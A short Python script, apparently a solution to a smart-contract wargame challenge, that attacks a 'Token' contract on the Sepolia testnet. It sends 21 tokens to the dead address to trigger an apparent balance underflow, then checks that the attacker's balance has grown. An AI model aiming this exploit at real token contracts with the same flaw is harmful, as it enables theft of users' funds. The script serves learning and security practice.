#!/usr/bin/python3
from ape import accounts, networks, project
from colorama import Fore

# * colours
green = Fore.GREEN
red = Fore.RED
blue = Fore.BLUE
magenta = Fore.MAGENTA
reset = Fore.RESET


# sepolia: 0x7F40916Cb08D4422419c60E403219bC62DFE26CD
ADDRESS = "0x7F40916Cb08D4422419c60E403219bC62DFE26CD"


def attack():
    attacker = accounts[0]
    contract = project.Token.at(ADDRESS)

    print(
        f"{green}Attacker Balance Before The Hack: {magenta}{contract.balanceOf(attacker.address)}{reset}"
    )
    print(f"{red}Attacking Now...{reset}")

    contract.transfer("0x000000000000000000000000000000000000dead", 21, sender=attacker)

    print(
        f"{green}Attacker Balance After The Hack: {magenta}{contract.balanceOf(attacker.address)}{reset}"
    )

    assert contract.balanceOf(attacker.address) >= 20


def main():
    attack()


if __name__ == "__main__":
    main()
